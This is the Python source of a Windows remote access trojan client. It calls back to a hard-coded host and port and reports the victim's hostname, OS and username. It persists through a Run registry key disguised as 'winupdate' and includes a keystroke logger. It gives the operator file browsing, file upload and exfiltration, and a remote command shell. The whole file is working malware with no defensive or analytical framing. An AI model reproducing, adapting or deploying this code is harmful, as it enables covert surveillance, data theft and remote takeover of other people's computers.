import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard
import win32api, winerror, win32event, win32crypt
from shutil import copyfile
from winreg import *

strHost = "10.5.45.28"
# strHost = socket.gethostbyname("")
intPort = 5888

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]


# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


while True:  # infinite loop until socket can connect
    try:
        objSocket = socket.socket()
        objSocket.connect((strHost, intPort))
    except socket.error:
        time.sleep(5)  # wait 5 seconds to try again
    else: break

strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
objSocket.send(str.encode(strUserInfo))
del strUserInfo  # delete data after it has been sent

# function to return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8")


def OnKeyboardEvent(event):
    global strKeyLogs

    try:  # check to see if variable is defined
        strKeyLogs
    except NameError:
        strKeyLogs = ""

    if event == Key.backspace:
        strKeyLogs += " [Bck] "
    elif event == Key.tab:
        strKeyLogs += " [Tab] "
    elif event == Key.enter:
        strKeyLogs += "\n"
    elif event == Key.space:
        strKeyLogs += " "
    elif type(event) == Key:  # if the character is some other type of special key
        strKeyLogs += " [" + str(event)[4:] + "] "
    else:
        strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character


KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while True:
        bytPart = objSocket.recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart
        if len(bytData) == buffer:
            return bytData


def startup():
    try:
        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
        copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
    except WindowsError:
        objSocket.send(str.encode("Unable to add to startup!"))
    else:
        objSocket.send(str.encode("success"))



def file_browser():
    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
    arrRawDrives = arrRawDrives.split('\000')[:-1]

    strDrives = ""
    for drive in arrRawDrives:  # get proper view and place array into string
        strDrives += drive.replace("\\", "") + "\n"
    objSocket.send(str.encode(strDrives))

    strDir = decode_utf8(objSocket.recv(1024))

    if os.path.isdir(strDir):
        arrFiles = os.listdir(strDir)

        strFiles = ""
        for file in arrFiles:
            strFiles += (file + "\n")

        objSocket.send(str.encode(str(len(strFiles))))  # send buffer size
        time.sleep(0.1)
        objSocket.send(str.encode(strFiles))

    else:  # if the user entered an invalid directory
        objSocket.send(str.encode("Invalid Directory!"))
        return


def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = decode_utf8(objSocket.recv(1024))

    try:
        objFile = open(strOutputFile, "wb")
        objFile.write(file_data)
        objFile.close()
        objSocket.send(str.encode("Done!!!"))
    except:
        objSocket.send(str.encode("Path is protected/invalid!"))


def receive(data):
    if not os.path.isfile(data):
        objSocket.send(str.encode("Target file not found!"))
        return

    objSocket.send(str.encode("File size: " + str(os.path.getsize(data))
                              + " bytes" + "\n" + "Please wait..."))
    objFile = open(data, "rb")  # send file contents and close the file
    time.sleep(1)
    objSocket.send(objFile.read())
    objFile.close()


def command_shell():
    strCurrentDir = str(os.getcwd())

    objSocket.send(str.encode(strCurrentDir))

    while True:
        strData = decode_utf8(objSocket.recv(1024))

        if strData == "goback":
            os.chdir(strCurrentDir)  # change directory back to original
            break

        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            if (objCommand.stderr.read()).decode("utf-8") == "":  # if there is no error
                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
                os.chdir(strOutput)  # change directory

                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it

            bytData = str.encode(strOutput + "\n" + str(os.getcwd()) + ">")
        else:
            bytData = str.encode("Error!!!")

        strBuffer = str(len(bytData))
        objSocket.send(str.encode(strBuffer))  # send buffer size
        time.sleep(0.1)
        objSocket.send(bytData)  # send output


def run_command(command):
    strLogOutput = "\n"

    if len(command) > 0:
        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="ignore")
    else:
        strLogOutput += "Error!!!"

    bytData = str.encode(strLogOutput)

    strBuffer = str(len(bytData))
    objSocket.send(str.encode(strBuffer))  # send buffer size
    time.sleep(0.1)
    objSocket.send(bytData)  # send output


try:
    while True:
        strData = objSocket.recv(1024)
        strData = decode_utf8(strData)

        if strData == "exit":
            objSocket.close()
            sys.exit(0)
        elif strData[:4] == "site":
            webbrowser.get().open(strData[4:])
        elif strData == "startup":
            startup()
        elif strData == "filebrowser":
            file_browser()
        elif strData[:4] == "send":
            upload(strData[4:])
        elif strData[:4] == "recv":
            receive(strData[4:])
        elif strData == "test":
            continue
        elif strData == "cmd":
            command_shell()
        elif strData[:6] == "runcmd":
            run_command(strData[6:])
except socket.error:  # if the server closes without warning
    objSocket.close()
    sys.exit(0)
